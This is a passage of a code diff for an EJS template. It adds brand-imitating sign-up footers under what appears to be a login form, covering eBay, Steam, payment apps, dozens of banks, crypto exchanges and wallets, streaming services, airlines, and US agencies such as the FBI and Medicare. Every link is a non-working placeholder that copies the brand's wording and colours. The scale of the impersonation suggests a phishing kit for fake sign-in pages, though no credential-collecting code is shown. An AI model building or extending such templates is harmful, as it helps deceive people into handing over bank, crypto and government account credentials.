+  <% if (tpl.key === 'ebay') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to eBay? <a href="#" onclick="return false" style="color:#E53238;font-weight:600">Register</a></div>
+  <% } %>
+  <% if (tpl.key === 'steam') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#aaa">New to Steam? <a href="#" onclick="return false" style="color:#66C0F4;font-weight:600">Create a free account</a></div>
+  <% } %>
+  <% if (tpl.key === 'slack') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#aaa">New to Slack? <a href="#" onclick="return false" style="color:#4A154B;font-weight:600">Create a new workspace</a></div>
+  <% } %>
+  <% if (tpl.key === 'adobe') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Adobe? <a href="#" onclick="return false" style="color:#FF0000;font-weight:600">Create account</a></div>
+  <% } %>
+  <% if (tpl.key === 'stripe') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Stripe? <a href="#" onclick="return false" style="color:#635BFF;font-weight:600">Create account</a></div>
+  <% } %>
+  <% if (tpl.key === 'cashapp') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Cash App? <a href="#" onclick="return false" style="color:#00D632;font-weight:600">Sign up</a></div>
+  <% } %>
+  <% if (tpl.key === 'venmo') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Venmo? <a href="#" onclick="return false" style="color:#3D95CE;font-weight:600">Sign up</a></div>
+  <% } %>
+  <% if (tpl.key === 'zelle') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Don't have Zelle? <a href="#" onclick="return false" style="color:#6D1ED4;font-weight:600">Enroll with your bank</a></div>
+  <% } %>
+  <% if (tpl.key === 'klarna') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#333">New to Klarna? <a href="#" onclick="return false" style="color:#17120E;font-weight:600">Create account</a></div>
+  <% } %>
+  <% if (tpl.key === 'afterpay') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Afterpay? <a href="#" onclick="return false" style="color:#000;font-weight:600">Create account</a></div>
+  <% } %>
+  <% if (tpl.key === 'wise') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Wise? <a href="#" onclick="return false" style="color:#163300;font-weight:600">Open a free account</a></div>
+  <% } %>
+  <% if (tpl.key === 'revolut') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Revolut? <a href="#" onclick="return false" style="color:#000;font-weight:600">Create account</a></div>
+  <% } %>
+  <% if (tpl.key === 'monzo') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Monzo? <a href="#" onclick="return false" style="color:#FF3464;font-weight:600">Get Monzo</a></div>
+  <% } %>
+  <% if (tpl.key === 'chime') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Don't have Chime? <a href="#" onclick="return false" style="color:#1EC677;font-weight:600">Get started — it's free</a></div>
+  <% } %>
+  <% if (tpl.key === 'skrill') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Skrill? <a href="#" onclick="return false" style="color:#862165;font-weight:600">Create account</a></div>
+  <% } %>
+  <% if (tpl.key === 'payoneer') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Payoneer? <a href="#" onclick="return false" style="color:#FF4800;font-weight:600">Sign up</a></div>
+  <% } %>
+  <% if (tpl.key === 'whatsapp') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Don't have WhatsApp? <a href="#" onclick="return false" style="color:#25D366;font-weight:600">Download</a></div>
+  <% } %>
+  <% if (tpl.key === 'telegram') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Telegram? <a href="#" onclick="return false" style="color:#2CA5E0;font-weight:600">Sign up</a></div>
+  <% } %>
+  <% if (tpl.key === 'threads') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Threads? <a href="#" onclick="return false" style="color:#000;font-weight:600">Create profile</a></div>
+  <% } %>
+  <% if (tpl.key === 'bereal') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to BeReal? <a href="#" onclick="return false" style="color:#000;font-weight:600">Sign up</a></div>
+  <% } %>
+  <% if (tpl.key === 'line') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to LINE? <a href="#" onclick="return false" style="color:#00B900;font-weight:600">Create account</a></div>
+  <% } %>
+  <% if (tpl.key === 'viber') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Viber? <a href="#" onclick="return false" style="color:#7360F2;font-weight:600">Download Viber</a></div>
+  <% } %>
+  <% if (tpl.key === 'wechat') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to WeChat? <a href="#" onclick="return false" style="color:#7BB32E;font-weight:600">Register</a></div>
+  <% } %>
+  <% if (tpl.key === 'icloudmail') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Don't have an Apple ID? <a href="#" onclick="return false" style="color:#1C6EF2;font-weight:600">Create yours now.</a></div>
+  <% } %>
+  <% if (tpl.key === 'tutanota') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Tutanota? <a href="#" onclick="return false" style="color:#840010;font-weight:600">Sign up free</a></div>
+  <% } %>
+  <% if (tpl.key === 'zohomail') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Zoho Mail? <a href="#" onclick="return false" style="color:#E42527;font-weight:600">Sign up free</a></div>
+  <% } %>
+  <% if (tpl.key === 'capitalOne') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a Capital One customer? <a href="#" onclick="return false" style="color:#D03027;font-weight:600">Open an account</a></div>
+  <% } %>
+  <% if (tpl.key === 'deutschebank') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a customer? <a href="#" onclick="return false" style="color:#0018A8;font-weight:600">Open an account</a></div>
+  <% } %>
+  <% if (tpl.key === 'bnpparibas') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a customer? <a href="#" onclick="return false" style="color:#008B3B;font-weight:600">Open an account</a></div>
+  <% } %>
+  <% if (tpl.key === 'goldmansachs') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Marcus? <a href="#" onclick="return false" style="color:#1a1a1a;font-weight:600">Open an account</a></div>
+  <% } %>
+  <% if (tpl.key === 'morganstanley') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a client? <a href="#" onclick="return false" style="color:#002244;font-weight:600">Contact us</a></div>
+  <% } %>
+  <% if (tpl.key === 'ubs') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a client? <a href="#" onclick="return false" style="color:#E2001A;font-weight:600">Contact us</a></div>
+  <% } %>
+  <% if (tpl.key === 'creditsuisse') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a client? <a href="#" onclick="return false" style="color:#00599A;font-weight:600">Contact us</a></div>
+  <% } %>
+  <% if (tpl.key === 'abnamro') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not yet a customer? <a href="#" onclick="return false" style="color:#009900;font-weight:600">Open an account</a></div>
+  <% } %>
+  <% if (tpl.key === 'rabobank') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not yet a customer? <a href="#" onclick="return false" style="color:#FF6600;font-weight:600">Become a member</a></div>
+  <% } %>
+  <% if (tpl.key === 'commerzbank') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a customer? <a href="#" onclick="return false" style="color:#000;font-weight:600">Open an account</a></div>
+  <% } %>
+  <% if (tpl.key === 'scotiabank') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a customer? <a href="#" onclick="return false" style="color:#CC0000;font-weight:600">Open an account</a></div>
+  <% } %>
+  <% if (tpl.key === 'anz') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not an ANZ customer? <a href="#" onclick="return false" style="color:#007DCE;font-weight:600">Open an account</a></div>
+  <% } %>
+  <% if (tpl.key === 'westpac') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a Westpac customer? <a href="#" onclick="return false" style="color:#D5002B;font-weight:600">Apply now</a></div>
+  <% } %>
+  <% if (tpl.key === 'standardchartered') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a customer? <a href="#" onclick="return false" style="color:#0072AA;font-weight:600">Apply now</a></div>
+  <% } %>
+  <% if (tpl.key === 'mashreq') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a Mashreq customer? <a href="#" onclick="return false" style="color:#C8102E;font-weight:600">Apply now</a></div>
+  <% } %>
+  <% if (tpl.key === 'adcb') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a customer? <a href="#" onclick="return false" style="color:#D71920;font-weight:600">Open an account</a></div>
+  <% } %>
+  <% if (tpl.key === 'fab') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a FAB customer? <a href="#" onclick="return false" style="color:#003366;font-weight:600">Open an account</a></div>
+  <% } %>
+  <% if (tpl.key === 'emiratesnbd') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a customer? <a href="#" onclick="return false" style="color:#CC0000;font-weight:600">Open an account</a></div>
+  <% } %>
+  <% if (tpl.key === 'qnb') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a QNB customer? <a href="#" onclick="return false" style="color:#470A68;font-weight:600">Apply now</a></div>
+  <% } %>
+  <% if (tpl.key === 'nab') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not an NAB customer? <a href="#" onclick="return false" style="color:#CC0000;font-weight:600">Apply now</a></div>
+  <% } %>
+  <% if (tpl.key === 'bbva') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not a customer? <a href="#" onclick="return false" style="color:#004481;font-weight:600">Open an account</a></div>
+  <% } %>
+  <% if (tpl.key === 'ing') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not an ING customer? <a href="#" onclick="return false" style="color:#FF6200;font-weight:600">Become a customer</a></div>
+  <% } %>
+  <% if (tpl.key === 'rbc') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">Not an RBC customer? <a href="#" onclick="return false" style="color:#003168;font-weight:600">Open an account</a></div>
+  <% } %>
+  <% if (['bitfinex','gemini','okx','bybit','huobi','kucoin','gateio','cryptocom','bitstamp','dydx','uniswap','exodus','phantom','solflare','lbank','coinex','bitget','pionex','htx','mexc','poloniex','phemex','bitmartex'].includes(tpl.key)) { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#888">New here? <a href="#" onclick="return false" style="color:#aaa;font-weight:600">Create account</a></div>
+  <% } %>
+  <% if (tpl.key === 'southwest') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#aaa">New to Rapid Rewards? <a href="#" onclick="return false" style="color:#F9B612;font-weight:600">Enroll</a></div>
+  <% } %>
+  <% if (tpl.key === 'disneyplus') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#aaa">New to Disney+? <a href="#" onclick="return false" style="color:#0072D2;font-weight:600">Subscribe</a></div>
+  <% } %>
+  <% if (tpl.key === 'hbomax') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#aaa">New to Max? <a href="#" onclick="return false" style="color:#0049FF;font-weight:600">Subscribe</a></div>
+  <% } %>
+  <% if (tpl.key === 'hulu') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Hulu? <a href="#" onclick="return false" style="color:#1CE783;font-weight:700">Start your free trial</a></div>
+  <% } %>
+  <% if (tpl.key === 'paramountplus') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#aaa">New to Paramount+? <a href="#" onclick="return false" style="color:#0064FF;font-weight:600">Subscribe</a></div>
+  <% } %>
+  <% if (tpl.key === 'appletvplus') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#aaa">New to Apple TV+? <a href="#" onclick="return false" style="color:#0071e3;font-weight:600">Try it free</a></div>
+  <% } %>
+  <% if (tpl.key === 'youtube') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#aaa">New to YouTube? <a href="#" onclick="return false" style="color:#FF0000;font-weight:600">Sign up</a></div>
+  <% } %>
+  <% if (tpl.key === 'crunchyroll') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Crunchyroll? <a href="#" onclick="return false" style="color:#FF6600;font-weight:600">Try it free</a></div>
+  <% } %>
+  <% if (tpl.key === 'vimeo') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Vimeo? <a href="#" onclick="return false" style="color:#1ab7ea;font-weight:600">Join for free</a></div>
+  <% } %>
+  <% if (tpl.key === 'applemusic') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#aaa">New to Apple Music? <a href="#" onclick="return false" style="color:#FC3C44;font-weight:600">Try it free</a></div>
+  <% } %>
+  <% if (tpl.key === 'tidal') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#aaa">New to TIDAL? <a href="#" onclick="return false" style="color:#fff;font-weight:600">Start free trial</a></div>
+  <% } %>
+  <% if (tpl.key === 'deezer') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#aaa">New to Deezer? <a href="#" onclick="return false" style="color:#A238FF;font-weight:600">Sign up free</a></div>
+  <% } %>
+  <% if (tpl.key === 'soundcloud') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to SoundCloud? <a href="#" onclick="return false" style="color:#FF5500;font-weight:600">Create account</a></div>
+  <% } %>
+  <% if (tpl.key === 'pandora') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#aaa">New to Pandora? <a href="#" onclick="return false" style="color:#3668FF;font-weight:600">Sign up free</a></div>
+  <% } %>
+  <% if (tpl.key === 'lastfm') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Last.fm? <a href="#" onclick="return false" style="color:#D51007;font-weight:600">Sign up</a></div>
+  <% } %>
+  <% if (tpl.key === 'bandcamp') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#666">New to Bandcamp? <a href="#" onclick="return false" style="color:#1da0c3;font-weight:600">Create account</a></div>
+  <% } %>
+  <% if (tpl.key === 'etihad') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#666">Not a member? <a href="#" onclick="return false" style="color:#B8A062;font-weight:600">Join Etihad Guest</a></div>
+  <% } %>
+  <% if (tpl.key === 'turkishairlines') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#666">Not a member? <a href="#" onclick="return false" style="color:#C8102E;font-weight:600">Join Miles&amp;Smiles</a></div>
+  <% } %>
+  <% if (tpl.key === 'lufthansa') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#aaa">Not a member? <a href="#" onclick="return false" style="color:#FFCC00;font-weight:600">Join Miles &amp; More</a></div>
+  <% } %>
+  <% if (tpl.key === 'britishairways') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#aaa">Not a member? <a href="#" onclick="return false" style="color:#075AAA;font-weight:600">Join BA Executive Club</a></div>
+  <% } %>
+  <% if (tpl.key === 'airfrance') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#aaa">Not a member? <a href="#" onclick="return false" style="color:#E2003C;font-weight:600">Join Flying Blue</a></div>
+  <% } %>
+  <% if (tpl.key === 'klm') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#aaa">Not a member? <a href="#" onclick="return false" style="color:#00A1DE;font-weight:600">Join Flying Blue</a></div>
+  <% } %>
+  <% if (tpl.key === 'delta') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#aaa">New to Delta? <a href="#" onclick="return false" style="color:#E01933;font-weight:600">Join SkyMiles</a></div>
+  <% } %>
+  <% if (tpl.key === 'unitedairlines') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#aaa">New to United? <a href="#" onclick="return false" style="color:#4DB3E6;font-weight:600">Join MileagePlus</a></div>
+  <% } %>
+  <% if (tpl.key === 'americanairlines') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#aaa">New to American? <a href="#" onclick="return false" style="color:#0078D2;font-weight:600">Join AAdvantage</a></div>
+  <% } %>
+  <% if (tpl.key === 'ryanair') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#aaa">New to Ryanair? <a href="#" onclick="return false" style="color:#F7A800;font-weight:600">Create account</a></div>
+  <% } %>
+  <% if (tpl.key === 'easyjet') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#666">New to easyJet? <a href="#" onclick="return false" style="color:#FF6600;font-weight:600">Register</a></div>
+  <% } %>
+  <% if (tpl.key === 'airarabia') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#aaa">New to Air Arabia? <a href="#" onclick="return false" style="color:#E6000F;font-weight:600">Register</a></div>
+  <% } %>
+  <% if (tpl.key === 'singaporeairlines') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#666">Not a member? <a href="#" onclick="return false" style="color:#C6A84B;font-weight:600">Join KrisFlyer</a></div>
+  <% } %>
+  <% if (tpl.key === 'cathaypacific') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#aaa">Not a member? <a href="#" onclick="return false" style="color:#006564;font-weight:600">Join Asia Miles</a></div>
+  <% } %>
+  <% if (tpl.key === 'ana') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#aaa">Not a member? <a href="#" onclick="return false" style="color:#0A1F6E;font-weight:600">Join ANA Mileage Club</a></div>
+  <% } %>
+  <% if (tpl.key === 'jal') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#666">Not a member? <a href="#" onclick="return false" style="color:#CC0000;font-weight:600">Join JAL Mileage Bank</a></div>
+  <% } %>
+  <% if (tpl.key === 'youtube') { %>
+    <div style="margin-top:10px;text-align:center;font-size:.83rem;color:#aaa">Already have a Google account? <a href="#" onclick="return false" style="color:#FF0000;font-weight:600">Sign in</a></div>
+  <% } %>
+  <% if (['uscis','tsa','nasa','fbi','dhs','usps','va','statedept','cia','nsa','medicare','medicaid','sba','ftc','sec','passport','un'].includes(tpl.key)) { %>
+    <div style="margin-top:10px;text-align:center;font-size:.78rem;color:#666">Need help? <a href="#" onclick="return false" style="color:#003366;font-weight:600">Contact us</a></div>
   <% } %>
 </div>
 
